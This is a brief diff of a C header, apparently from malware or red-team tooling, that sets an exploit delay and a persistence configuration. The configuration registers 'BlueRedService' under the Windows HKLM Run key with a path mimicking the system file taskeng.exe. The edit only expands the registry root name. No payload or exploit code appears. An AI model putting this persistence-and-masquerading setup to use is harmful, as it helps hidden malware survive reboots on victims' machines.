@@ -20,7 +20,7 @@
 #define EXPLOIT_DELAY_MS 150
 
 // Persistence Configuration
-#define PERSIST_PATH L"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define PERSIST_PATH L"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
 #define PERSIST_VAL_NAME L"BlueRedService"
 #define PERSIST_VAL_DATA L"C:\\Windows\\System32\\taskeng.exe"
 
